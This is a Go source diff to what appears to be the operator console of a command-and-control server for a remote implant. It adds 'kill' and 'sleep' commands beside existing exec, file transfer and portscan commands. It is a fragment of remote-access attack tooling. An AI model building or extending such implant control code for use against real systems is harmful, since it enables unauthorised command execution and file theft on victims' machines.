@@ -72,6 +72,8 @@ func (c2 *c2) help() {
 	c2.writeString("\texec <cmd>                -> Exec command")
 	c2.writeString("\tgetfile <filename>        -> Get file from server")
 	c2.writeString("\tputfile <local> <remote>  -> Put file from server")
+	c2.writeString("\tkill                      -> Kill the implant")
+	c2.writeString("\tsleep <seconds>           -> Sleep the implant")
 }
 
 func (c2 *c2) handle(text string) {
@@ -140,6 +142,23 @@ func (c2 *c2) handle(text string) {
 	case "list":
 		message := &pb.ListModules{}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Listmodules{Listmodules: message}}
+	case "kill":
+		log.Println("Killed implant")
+		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Kill{Kill: 1}}
+	case "sleep":
+		if len(parts) != 2 {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
+		}
+		seconds, err := strconv.Atoi(parts[1])
+		if err != nil {
+			fmt.Println("Not a valid int: " + parts[1])
+			return
+		}
+
+		log.Println("Implant sleeping...")
+		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Sleep{Sleep: int64(seconds)}}
 	case "help":
 		c2.help()
 	default:
@@ -205,6 +224,7 @@ var completer = readline.NewPrefixCompleter(
 	readline.PcItem("getfile"),
 	readline.PcItem("putfile", readline.PcItemDynamic(listfiles)),
 	readline.PcItem("portscan"),
+	readline.PcItem("kill"),
 	readline.PcItem("help"),
 )
 
